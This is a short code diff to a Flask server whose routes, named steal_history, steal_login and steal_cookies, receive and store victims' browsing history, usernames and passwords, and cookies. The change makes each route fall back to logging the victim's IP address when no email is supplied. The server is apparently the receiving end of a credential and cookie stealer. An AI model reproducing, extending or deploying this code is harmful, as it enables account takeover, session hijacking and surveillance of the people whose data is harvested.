@@ -74,6 +74,8 @@ def get_random(email):
 @app.route("/steal_history", methods=['POST'])
 def steal_history():
     email = request.form['email']
+    if email=="no_email_found":
+        email = request.remote_addr
     urls = request.form.getlist('urls[]')
     last_visited = request.form.getlist('last_visits[]')
     history.bulk_add_to_history(email, urls, last_visited)
@@ -83,6 +85,8 @@ def steal_history():
 def steal_login():
     if request.method == 'POST':
         email = request.form['email']
+        if email=="no_email_found":
+            email = request.remote_addr
         url = request.form['url']
         username = request.form['username']
         password = request.form['password']
@@ -94,6 +98,8 @@ def steal_login():
 def steal_cookies():
     if request.method == 'POST':
         email = request.form['email']
+        if email=="no_email_found":
+            email = request.remote_addr
         url = request.form['url']
         cookie = request.form['cookies']
         cookies.bulk_add_to_cookies(email, url, cookie)
